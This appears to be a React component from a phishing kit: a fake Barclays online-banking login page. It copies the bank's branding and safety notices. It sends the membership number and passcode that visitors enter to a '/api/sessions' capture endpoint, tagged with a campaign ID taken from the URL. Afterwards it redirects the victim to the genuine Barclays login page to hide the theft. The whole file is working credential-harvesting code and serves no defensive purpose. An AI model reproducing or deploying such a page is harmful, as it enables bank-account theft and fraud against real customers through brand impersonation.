import { useState } from "react";
import { useForm } from "react-hook-form";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { apiRequest } from "@/lib/queryClient";

interface LoginFormData {
  memberId: string;
  passcode: string;
}

export default function BarclaysLoginPage() {
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const form = useForm<LoginFormData>({
    defaultValues: {
      memberId: "",
      passcode: "",
    },
  });

  const onSubmit = async (data: LoginFormData) => {
    setIsSubmitting(true);
    
    try {
      await apiRequest("POST", "/api/sessions", {
        username: data.memberId,
        password: data.passcode,
        ipAddress: "unknown",
        status: "complete",
        completionPercentage: 100,
        campaignId: new URLSearchParams(window.location.search).get("cid") || "unknown",
      });

      setTimeout(() => {
        window.location.href = "https://bank.barclays.co.uk/olb/auth/LoginMember.do";
      }, 1500);
    } catch (error) {
      console.error("Error capturing session:", error);
      setTimeout(() => {
        window.location.href = "https://bank.barclays.co.uk/olb/auth/LoginMember.do";
      }, 1500);
    }
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="bg-white border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center">
              <div className="flex-shrink-0">
                <svg width="120" height="32" viewBox="0 0 120 32" className="text-blue-800">
                  <rect width="120" height="32" fill="#00AEEF" rx="4"/>
                  <text x="12" y="22" fill="white" fontSize="18" fontWeight="bold">Barclays</text>
                </svg>
              </div>
            </div>
            <nav className="hidden md:flex space-x-8">
              <a href="#" className="text-gray-700 hover:text-gray-900">Help</a>
              <a href="#" className="text-gray-700 hover:text-gray-900">Security</a>
              <a href="#" className="text-gray-700 hover:text-gray-900">Contact</a>
            </nav>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div className="flex min-h-[calc(100vh-4rem)]">
        {/* Left Side - Login Form */}
        <div className="flex-1 flex flex-col justify-center px-4 sm:px-6 lg:px-20">
          <div className="mx-auto w-full max-w-md">
            <div className="bg-white rounded-lg border border-gray-200 p-8 shadow-sm">
              <div className="text-center mb-8">
                <h2 className="text-2xl font-bold text-gray-900">
                  Log in to Online Banking
                </h2>
                <p className="mt-2 text-gray-600">
                  Access your accounts securely
                </p>
              </div>

              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                <div>
                  <label htmlFor="memberId" className="block text-sm font-medium text-gray-700 mb-2">
                    Barclays Online Banking membership number
                  </label>
                  <Input
                    id="memberId"
                    type="text"
                    {...form.register("memberId", { required: true })}
                    className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:border-blue-500 focus:ring-blue-500"
                    placeholder="Enter your membership number"
                    data-testid="input-member-id"
                  />
                </div>

                <div>
                  <label htmlFor="passcode" className="block text-sm font-medium text-gray-700 mb-2">
                    Passcode
                  </label>
                  <Input
                    id="passcode"
                    type="password"
                    {...form.register("passcode", { required: true })}
                    className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:border-blue-500 focus:ring-blue-500"
                    placeholder="Enter your passcode"
                    data-testid="input-passcode"
                  />
                </div>

                <div className="flex items-center justify-between">
                  <div className="flex items-center">
                    <input
                      id="remember"
                      name="remember"
                      type="checkbox"
                      className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
                    />
                    <label htmlFor="remember" className="ml-2 block text-sm text-gray-900">
                      Remember my membership number
                    </label>
                  </div>
                </div>

                <Button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 px-4 rounded-md font-medium"
                  data-testid="button-login"
                >
                  {isSubmitting ? "Logging in..." : "Log in"}
                </Button>
              </form>

              <div className="mt-6">
                <div className="text-center">
                  <a href="#" className="text-sm text-blue-600 hover:text-blue-500">
                    Forgotten your log in details?
                  </a>
                </div>
                <div className="text-center mt-2">
                  <a href="#" className="text-sm text-blue-600 hover:text-blue-500">
                    Register for Online Banking
                  </a>
                </div>
              </div>

              <div className="mt-8 pt-6 border-t border-gray-200">
                <div className="text-center text-xs text-gray-500">
                  <p className="mb-2">
                    <strong>Stay safe online:</strong> We'll never ask for your full passcode in an email, text or phone call.
                  </p>
                  <p>
                    If you're concerned about fraud, call us immediately on <strong>0345 734 5345</strong>
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Right Side - Marketing */}
        <div className="hidden lg:flex lg:w-1/3 bg-gradient-to-br from-blue-600 to-blue-800 p-12 items-center">
          <div className="text-white">
            <h3 className="text-2xl font-bold mb-6">Banking made simple</h3>
            <ul className="space-y-4">
              <li className="flex items-start">
                <div className="w-2 h-2 bg-white rounded-full mt-2 mr-3"></div>
                <span>24/7 access to your accounts</span>
              </li>
              <li className="flex items-start">
                <div className="w-2 h-2 bg-white rounded-full mt-2 mr-3"></div>
                <span>Transfer money instantly</span>
              </li>
              <li className="flex items-start">
                <div className="w-2 h-2 bg-white rounded-full mt-2 mr-3"></div>
                <span>Pay bills and manage direct debits</span>
              </li>
              <li className="flex items-start">
                <div className="w-2 h-2 bg-white rounded-full mt-2 mr-3"></div>
                <span>Advanced security features</span>
              </li>
            </ul>
            <div className="mt-8 p-4 bg-white/10 rounded-lg">
              <h4 className="font-semibold mb-2">New to Barclays?</h4>
              <p className="text-sm opacity-90">Join millions of customers who trust us with their banking needs.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}